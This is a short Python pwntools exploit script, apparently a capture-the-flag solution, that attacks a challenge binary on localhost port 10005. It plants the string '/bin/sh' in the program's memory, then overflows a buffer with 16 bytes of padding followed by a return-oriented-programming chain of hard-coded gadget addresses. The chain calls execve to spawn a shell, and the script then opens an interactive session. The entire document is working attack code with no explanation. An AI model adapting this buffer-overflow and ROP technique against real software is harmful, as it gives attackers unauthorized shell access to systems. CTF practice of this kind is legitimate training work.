from pwn import *

isremote = True
if isremote:
    r = remote("localhost", 10005)
else:
    r = process("./src/chal")

r.recvline()
r.sendline("/bin/sh\x00")
r.recvline()

pop_rdi = p64(0x401f2f)
pop_rsi = p64(0x409f9e)
pop_rax_rdx_rbx = p64(0x47f2ea)
syscall = p64(0x401ce4)
bin_sh = p64(0x4c72f0)

rop_chain = pop_rdi + bin_sh + pop_rsi + p64(0) + pop_rax_rdx_rbx + p64(59) + p64(0) + p64(0xdeadbeef) + syscall

payload = 'a'*16 + rop_chain

raw_input()

r.sendline(payload)

r.interactive()